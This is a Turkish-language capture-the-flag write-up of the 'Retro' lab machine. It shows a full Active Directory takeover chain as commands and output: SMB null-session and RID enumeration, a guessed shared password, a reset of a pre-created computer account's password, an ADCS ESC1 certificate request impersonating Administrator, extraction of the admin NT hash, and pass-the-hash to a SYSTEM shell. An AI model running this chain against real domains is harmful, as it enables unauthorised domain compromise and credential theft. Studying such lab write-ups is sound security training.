#### About

`Retro` is an Easy Windows machine that showcases an Active Directory Domain Controller. Through SMB enumeration and pre-created machine account exploitation, we gain access to the system. Through the exploitation of the Active Directory Certificate Service and specifically by using the `ESC1` attack, which involves exploiting certificate templates to impersonate the Administrative user, privilege escalation is achieved.

---

## 1. Genel Bakış

Retro, ilk AD (Active Directory) kutumuz ve gerçekten güzel bir öğretici zincire sahip. Kısaca yol haritası şöyleydi:

1. SMB üzerinde açık paylaşımları (share) kurcaladım, bir not dosyasında zayıf/paylaşılan şifre ipucu buldum.
2. Bu ipucuyla bir domain kullanıcısına giriş yaptım, oradan başka bir not daha buldum — bu sefer "eski, önceden oluşturulmuş bir bilgisayar hesabı" ipucu.
3. Bu bilgisayar hesabının şifresi yoktu, ben de şifresini kendim belirledim.
4. Bu hesapla AD Certificate Services'i (ADCS) taradım ve klasik bir **ESC1** zafiyeti buldum.
5. ESC1 ile kendime Administrator adına bir sertifika çıkardım, bu sertifikayla domain admin hash'ini aldım ve makineye tam yetkiyle bağlandım.

---

## 2. Keşif

```bash
nmap -sS -A -T5 -p- 10.129.234.44
```

Tarama sonucunda klasik bir Domain Controller port profili çıktı: 53 (DNS), 88 (Kerberos), 135/139/445 (RPC/SMB), 389/636/3268/3269 (LDAP), 3389 (RDP) ve birkaç yüksek numaralı RPC portu. SSL sertifikasından domainin **retro.vl**, makine adının da **DC** olduğunu gördüm.

AD kutularında ilk refleks her zaman SMB'ye bakmak oluyor, o yüzden oradan başladım.

---

## 3. SMB Enumeration — Açık Paylaşımlar

```bash
smbclient -L 10.129.234.44 -N
```

Null session ile paylaşım listesini çektim:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Notes           Disk
SYSVOL          Disk      Logon server share
Trainees        Disk
```

`Notes` ve `Trainees` isimleri dikkatimi çekti — özel/varsayılan olmayan paylaşımlar genelde bir şey saklıyor olur. `Notes`'a bağlanmayı denedim ama erişim reddedildi. `Trainees`'e bağlandığımda ise içeride bir dosya vardı:

```bash
smbclient //10.129.234.44/Trainees
smb: \> get Important.txt
```

```
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards
The Admins
```

Bu notu okuyunca aklıma direkt şu geldi: **"herkes aynı ortak hesabı kullanıyor"** deniyor — yani muhtemelen basit, tahmin edilebilir bir kullanıcı adı/şifre kombinasyonu var. Bu tarz notlarda genelde kullanıcı adı ile şifre aynı ya da çok yakın oluyor, o yüzden önce en klasik ihtimali denemeye karar verdim.

---

## 4. Kullanıcı Keşfi ve İlk Giriş

Önce elimde kullanıcı isimleri yoktu, o yüzden `guest` hesabıyla RID brute-force yaparak domain kullanıcı listesini çıkardım:

```bash
nxc smb 10.129.234.44 -u guest -p '' --rid-brute
```

Bu bana bir sürü grup SID'i ile birlikte gerçek kullanıcı hesaplarını da verdi: `trainee`, `jburley`, `tblack` gibi isimler ve `BANKING$` adında bir **bilgisayar hesabı** dikkatimi çekti (sonradan önemli olacak).

`trainee` ismini görünce, Important.txt'teki "hepinizi tek hesapta topladık" notunu hatırladım ve en basit tahmini denedim — kullanıcı adı ile aynı şifre:

```bash
nxc smb 10.129.234.44 -u trainee -p 'trainee'
```

Ve **çalıştı**. `trainee:trainee` ile domain'e authenticated bir kullanıcı olarak giriş yapmış oldum. Bu kimlikle paylaşımları tekrar listeledim:

```bash
nxc smb 10.129.234.44 -u trainee -p 'trainee' --shares
```

Bu sefer `Notes` paylaşımına da `READ` yetkim vardı. Bağlandım:

```bash
smbclient //10.129.234.44/Notes -U 'trainee%trainee'
smb: \> get user.txt
smb: \> get ToDO.txt
```

`user.txt` doğrudan ilk flag'di. `ToDO.txt` ise bana bir sonraki ipucunu verdi:

```
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best
James
```

Bu not doğrudan **önceden oluşturulmuş (pre-created) bir bilgisayar hesabından** bahsediyor. RID brute-force'ta gördüğüm `BANKING$` hesabı da tam olarak bu profile uyuyordu — "banking" yazılımından kalma, eski, muhtemelen unutulmuş bir makine hesabı.

---

## 5. Pre-Created Computer Account İstismarı

AD'de bir bilgisayar hesabı "önceden oluşturulmuş" (pre-created) ama hiç bir makineye join edilmemişse, genellikle **hiçbir şifresi yoktur** ya da şifre politikası dışında, ilk girişte serbestçe belirlenebilir durumda kalır. Bunu doğrulamak için önce boş/basit şifrelerle denedim, olmadı. Sonra aklıma direkt şifreyi kendim atamak geldi — çünkü bu tarz hesaplarda genelde "password reset" işlemi, hesabın kendisi ile (henüz şifresi olmadığı için boş kimlik bilgisiyle) yapılabiliyor:

```bash
impacket-changepasswd -newpass 123456 'retro.vl/BANKING$:banking@dc.retro.vl' -protocol rpc-samr
```

`-protocol rpc-samr` eklemem gerekti çünkü normal SMB tabanlı şifre değiştirme, bilgisayar hesapları için farklı bir hata veriyordu (`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`). SAMR protokolü üzerinden denediğimde:

```
[*] Password was changed successfully.
```

Şifreyi kendim `123456` olarak belirlemiş oldum. Doğruladım:

```bash
nxc smb dc.retro.vl -u 'BANKING$' -p '123456'
```

Giriş başarılıydı. Artık elimde geçerli bir domain hesabı (bir bilgisayar/makine hesabı olsa da) vardı ve bu hesapla AD'nin daha derin servislerine bakabilirdim.

---

## 6. AD Certificate Services (ADCS) Taraması — ESC1

Elimde bir domain kimliği olduğu için, AD kutularında artık standart hale gelen bir kontrolü yaptım: **Certificate Services yanlış yapılandırması var mı?** Bunun için `certipy-ad`'nin `find -vulnerable` özelliğini kullandım:

```bash
certipy-ad find -u 'BANKING$@retro.vl' -p '123456' -vulnerable -stdout
```

Çıktıda bir sertifika şablonu (`RetroClients`) işaretlenmişti:

```
Certificate Templates
  Template Name                : RetroClients
  Enrollee Supplies Subject     : True
  Extended Key Usage            : Client Authentication
  Enrollment Rights             : RETRO.VL\Domain Computers, RETRO.VL\Domain Admins, RETRO.VL\Enterprise Admins

  [!] Vulnerabilities
    ESC1 : Enrollee supplies subject and template allows client authentication.
```

Buradaki kritik nokta şuydu: bu şablona **`Domain Computers`** grubu bile enroll (kayıt/sertifika talep etme) yetkisine sahipti — ve benim `BANKING$` hesabım zaten bir bilgisayar hesabı olduğu için otomatik olarak bu gruba dahildi. Yani elimdeki düşük yetkili makine hesabıyla bu şablon üzerinden sertifika talep edebiliyordum. Şablon aynı zamanda "Enrollee Supplies Subject" diyordu — yani sertifikayı talep eden kişi, sertifikanın **kime ait olacağını kendisi belirleyebiliyordu**. Bu, klasik **ESC1** senaryosunun tam tanımı.

---

## 7. ESC1 İstismarı — Administrator Adına Sertifika Talebi

`BANKING$` hesabımla, ama sertifikanın **Administrator**'a ait olduğunu belirterek bir talep gönderdim:

```bash
certipy-ad req -u 'BANKING$@retro.vl' -p '123456' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096 -dc-ip 10.129.234.44 -dc-host 'DC.retro.vl' -dynamic-endpoint
```

CA (Certificate Authority), şablonun izin verdiği şekilde talebimi hiç sorgulamadan onayladı ve bana **Administrator kimliğine ait geçerli bir sertifika** verdi:

```
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Saving certificate and private key to 'administrator.pfx'
```

Elimde artık gerçek Administrator hesabına ait, CA tarafından imzalanmış bir `.pfx` sertifikası vardı.

---

## 8. Sertifikadan Kerberos TGT ve NT Hash Elde Etme

Bu sertifikayı kullanarak doğrudan Administrator olarak Kerberos kimlik doğrulaması yapabiliyordum:

```bash
certipy-ad auth -pfx administrator_*.pfx -dc-ip 10.129.234.44 -username administrator -domain retro.vl
```

Certipy hem bir Kerberos TGT (ticket) aldı hem de bonus olarak Administrator'ın **NT hash'ini** çözüp bana verdi:

```
[*] Got TGT
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

Bu noktadan sonra artık şifreye bile ihtiyacım yoktu — elimde Administrator'ın NT hash'i vardı ve bunu doğrudan **pass-the-hash** ile kullanabilirdim.

---

## 9. Administrator Olarak Sisteme Erişim

Önce hash'in gerçekten geçerli olduğunu doğruladım:

```bash
nxc smb 10.129.234.44 -u Administrator -H '252fac7066d93dd009d4fd2cd0368389' -d retro.vl
```

```
retro.vl\Administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)
```

`Pwn3d!` etiketini görünce iş bitmişti. Doğrudan `impacket-psexec` ile hash üzerinden tam bir SYSTEM/Administrator shell'i aldım:

```bash
impacket-psexec -hashes ':252fac7066d93dd009d4fd2cd0368389' 'retro.vl/Administrator@10.129.234.44'
```

```
C:\Windows\system32>
```

Artık Domain Controller üzerinde Administrator yetkisindeydim.

---

## 10. Root Flag

```bash
C:\> type C:\Users\Administrator\Desktop\root.txt
40fce9c3f09024bcab29d377ee1ed071
```
